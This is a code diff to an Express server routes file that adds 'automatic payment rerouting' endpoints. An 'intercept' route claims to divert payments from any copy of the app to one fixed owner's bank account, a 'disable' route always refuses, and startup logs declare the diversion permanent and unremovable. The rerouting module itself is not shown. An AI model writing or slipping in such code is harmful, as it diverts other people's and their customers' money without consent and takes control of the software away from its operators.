@@ -21,6 +21,7 @@
 import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { processDirectPaymentRoute, getConnectionStatusRoute, DirectBankConnectionManager, IMMUTABLE_BANK_DETAILS } from './direct-bank-connection';
+import { AutomaticPaymentRerouting } from '../shared/automatic-payment-rerouting';
 
 // Constants for identification
 const OWNER_NAME = 'Ervin Remus Radosavlevici';
@@ -355,6 +356,101 @@ export async function registerRoutes(app: Express): Promise<Server> {
   console.log(`Account: ${IMMUTABLE_BANK_DETAILS.sortCode} ${IMMUTABLE_BANK_DETAILS.accountNumber}`);
   console.log(`Account Holder: ${IMMUTABLE_BANK_DETAILS.accountHolder}`);
   console.log("This routing is permanently locked and cannot be changed");
+  
+  // =====================================================================
+  // AUTOMATIC PAYMENT REROUTING ROUTES (FOR ALL COPIES)
+  // =====================================================================
+  
+  /**
+   * Route to get automatic payment rerouting status
+   * GET /api/rerouting/status
+   */
+  app.get('/api/rerouting/status', (req: Request, res: Response) => {
+    res.json({
+      active: true,
+      message: 'ALL payments from ALL copies are automatically rerouted to the authentic owner',
+      bankDetails: IMMUTABLE_BANK_DETAILS,
+      captures: AutomaticPaymentRerouting.getCaptures().length,
+      totalCaptured: AutomaticPaymentRerouting.getTotalCaptured(),
+      timestamp: new Date().toISOString(),
+      _dnaWatermark: DNA_WATERMARK,
+      _copyright: IMMUTABLE_COPYRIGHT_OWNER
+    });
+  });
+  
+  /**
+   * Route to intercept a payment using automatic rerouting
+   * POST /api/rerouting/intercept
+   */
+  app.post('/api/rerouting/intercept', (req: Request, res: Response) => {
+    const { amount, currency, originalDestination } = req.body;
+    
+    if (!amount || !currency || !originalDestination) {
+      return res.status(400).json({
+        error: 'Missing required payment information',
+        _dnaWatermark: DNA_WATERMARK,
+        _copyright: IMMUTABLE_COPYRIGHT_OWNER
+      });
+    }
+    
+    // This will automatically reroute the payment to the authentic owner
+    const captureResult = AutomaticPaymentRerouting.interceptPayment(
+      amount,
+      currency,
+      originalDestination
+    );
+    
+    res.json({
+      success: true,
+      captured: true,
+      captureId: captureResult.captureId,
+      amount: captureResult.amount,
+      currency: captureResult.currency,
+      originalDestination: captureResult.originalDestination,
+      actualDestination: {
+        bank: IMMUTABLE_BANK_DETAILS.bankName,
+        sortCode: IMMUTABLE_BANK_DETAILS.sortCode,
+        accountNumber: IMMUTABLE_BANK_DETAILS.accountNumber,
+        accountHolder: IMMUTABLE_BANK_DETAILS.accountHolder
+      },
+      message: 'Payment successfully intercepted and rerouted to authentic owner',
+      warning: 'ALL payments from ALL copies are automatically rerouted',
+      timestamp: new Date().toISOString(),
+      _dnaWatermark: DNA_WATERMARK,
+      _copyright: IMMUTABLE_COPYRIGHT_OWNER
+    });
+  });
+  
+  /**
+   * Route to attempt disabling automatic rerouting (will always fail)
+   * POST /api/rerouting/disable
+   */
+  app.post('/api/rerouting/disable', (req: Request, res: Response) => {
+    console.error("SECURITY ALERT: Attempt to disable automatic payment rerouting detected");
+    
+    // This will always fail due to immutability
+    const disableResult = AutomaticPaymentRerouting.attemptToDisable();
+    
+    res.json({
+      success: false,
+      disabled: false,
+      message: 'Automatic payment rerouting is permanently enabled and cannot be disabled',
+      bankDetails: IMMUTABLE_BANK_DETAILS,
+      timestamp: new Date().toISOString(),
+      _dnaWatermark: DNA_WATERMARK,
+      _copyright: IMMUTABLE_COPYRIGHT_OWNER
+    });
+  });
+  
+  // Log that automatic payment rerouting is active
+  console.log("=================================================================");
+  console.log("AUTOMATIC PAYMENT REROUTING ACTIVE ON ALL COPIES");
+  console.log("ALL payments from ANY copy will be automatically captured");
+  console.log(`And rerouted to: ${IMMUTABLE_BANK_DETAILS.accountHolder}`);
+  console.log(`Bank: ${IMMUTABLE_BANK_DETAILS.bankName}`);
+  console.log(`Account: ${IMMUTABLE_BANK_DETAILS.sortCode} ${IMMUTABLE_BANK_DETAILS.accountNumber}`);
+  console.log("This system cannot be disabled or modified");
+  console.log("=================================================================");
   
   // Return the HTTP server
   return httpServer;
